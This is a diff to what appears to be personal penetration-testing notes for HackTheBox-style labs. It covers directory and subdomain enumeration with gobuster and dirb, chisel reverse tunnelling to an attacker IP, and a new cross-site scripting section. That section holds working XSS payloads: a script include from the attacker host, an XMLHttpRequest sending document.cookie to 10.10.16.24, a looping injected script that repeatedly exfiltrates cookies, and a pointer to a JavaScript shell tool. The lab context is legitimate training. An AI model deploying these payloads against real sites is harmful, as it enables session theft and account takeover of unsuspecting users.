@@ -15,6 +15,12 @@ https://www.nickczh.com/upgrading-your-shell/
 
 gobuster dir --url https://10.129.240.189 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
 
+### dirb
+
+for php pages dirb works best
+
+dirb http://mailroom.htb
+
 ### subdomain enumeration gobuster
 gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u stocker.htb -t 50 --append-domain 
 
@@ -94,5 +100,21 @@ how to add attacker ot proxychains is what i need to look into
 .\chisel.exe client 10.10.16.24:9095 R:80localhost:80 R:443:localhost:443 R:8888:localhost:8888 R:9251:localhost:9251
 ./chisel server -p 9095 -reverse
 
+### cross site scripting
 
 
+<img src="10.10.16.24:8000/test.jpg" /> <script src="http://10.10.16.24:8000/cookie.js"></script>
+
+```
+var request = new XMLHttpRequest();
+request.open('GET', 'http://10.10.16.24:9001/?test='+document.cookie, true);
+request.send()
+```
+
+https://github.com/shelld3v/JSshell
+for shell
+
+
+jsh.py -g
+
+<script>setInterval(function(){with(document)body.appendChild(createElement("script")).src="//10.10.16.24:4848/?".concat(document.cookie)},1010)</script>
